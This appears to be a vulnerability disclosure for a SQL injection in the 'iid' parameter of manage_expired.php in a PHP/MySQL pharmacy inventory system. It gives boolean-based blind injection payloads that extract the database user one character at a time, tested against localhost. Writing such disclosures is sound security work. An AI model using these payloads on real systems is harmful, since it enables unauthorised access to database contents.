# Pharmacy Sales and Inventory System using PHP/MySQL with Source Code - SQL Injection

The environment

[https://www.sourcecodester.com/php/14500/pharmacy-sales-and-inventory-system-using-phpmysql-source-code.html](https://www.sourcecodester.com/php/14500/pharmacy-sales-and-inventory-system-using-phpmysql-source-code.html "https://www.sourcecodester.com/php/14500/pharmacy-sales-and-inventory-system-using-phpmysql-source-code.html")

In `pharmacy/manage_expired.php`, it was found that SQL statements are executed directly by concatenating `$_GET['iid']`.

![](image/image_MGq2AF2D3j.png)

Access: [http://127.0.0.1/manage\_expired.php?iid=1](http://127.0.0.1/manage_expired.php?iid=1 "http://127.0.0.1/manage_expired.php?iid=1")

![](image/image_RSNQtRmcvA.png)

Analyzing the code, the composed SQL statement is: `UPDATE inventory SET expired_confirmed = 1 WHERE id = 1`.

![](image/image__V5E5oAK83.png)

Construct Payload

<http://127.0.0.1/manage_expired.php?iid=>`1 and 1=2`

![](image/image_Ex9-OrLzqo.png)

There is no data output below. Attempting to read the first character of the current user. The current user is root, and its ASCII value is 114

<http://127.0.0.1/manage_expired.php?iid=>`1 and ascii(substring(user(),1,1))=114`

![There is output.](image/image_a4kYzTO-oY.png "There is output.")

<http://127.0.0.1/manage_expired.php?iid=>`1 and ascii(substring(user(),1,1))=113`

![There is no output.](image/image_rXu0EpNH59.png "There is no output.")
